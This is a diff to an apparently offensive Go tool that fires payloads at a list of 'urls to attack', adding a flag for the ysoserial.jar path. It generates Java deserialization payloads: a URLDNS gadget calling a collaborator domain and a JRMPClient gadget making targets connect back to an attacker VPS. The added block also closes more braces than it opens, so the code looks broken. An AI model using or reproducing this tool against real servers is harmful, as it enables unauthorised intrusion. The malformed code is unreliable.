@@ -8,6 +8,7 @@
 //	-o "log.txt"
 //	-h "Cookie: asd=123; qwe=321;"
 //	-h "Custom2: headervalue123"
+//  -y "/path/to/ysoserial.jar"
 //
 // To do: 
 //	[+] Add POST requests
@@ -78,6 +79,7 @@ func main() {
 	// 1. Flags declaration ---
 	//concurrency := flag.Int("t", 10, "Set the threads (concurrency) for greater speeds")
 	vps_ip := flag.String("i", "", "Value for [vps_ip] placeholder used inside the payload wordlist")
+	ysoserial_path := flag.String("y", "", "Path to ysoserial.jar")
 	domain_collab := flag.String("d", "", "Value for [domain_collab] placeholder used inside the payload wordlist")
 	flag.Var(&headers, "h", "Custom header (can be used multiple times)") // declared above main
 	urls_list_path := flag.String("u", "", "List with urls to attack - example line: http://example.com?a=1&b=2")
@@ -104,22 +106,27 @@ func main() {
 		}
 	}
 
-	// 3.1. Generate ysoserial URLDNS payload and add them to []payloads{}
-	output, err := exec.Command("java", "-jar", "ysoserial.jar", "URLDNS", "http://"+*domain_collab).CombinedOutput()
-	if err != nil {
-	  os.Stderr.WriteString(err.Error())
-	}
-	uEnc := b64.URLEncoding.EncodeToString([]byte(output))
-   	payloads = append(payloads,uEnc)
+	if flagset["y"] {
+		// 3.1. Generate ysoserial URLDNS payload and add them to []payloads{}
+		output, err := exec.Command("java", "-jar", *ysoserial_path, "URLDNS", "http://"+*domain_collab).CombinedOutput()
+		if err != nil {
+		  os.Stderr.WriteString(err.Error())
+		}
+		uEnc := b64.URLEncoding.EncodeToString([]byte(output))
+	   	payloads = append(payloads,uEnc)
 
-   	// 3.2. Generate ysoserial JRMPClient payload and add them to []payloads{}
-	output, err = exec.Command("java", "-jar", "ysoserial.jar", "JRMPClient", *vps_ip+":80").CombinedOutput()
-	if err != nil {
-	  os.Stderr.WriteString(err.Error())
-	}
-	uEnc = b64.URLEncoding.EncodeToString([]byte(output))
-   	payloads = append(payloads,uEnc)
-   	fmt.Println(uEnc)
+	   	// 3.2. Generate ysoserial JRMPClient payload and add them to []payloads{}
+		output, err = exec.Command("java", "-jar", *ysoserial_path, "JRMPClient", *vps_ip+":80").CombinedOutput()
+		if err != nil {
+		  os.Stderr.WriteString(err.Error())
+		}
+		uEnc = b64.URLEncoding.EncodeToString([]byte(output))
+	   	payloads = append(payloads,uEnc)
+	   	fmt.Println(uEnc)
+			}
+
+		}
+
 
 	// 4. Load urls_list into array
 	urls_list, err := readLines(*urls_list_path)
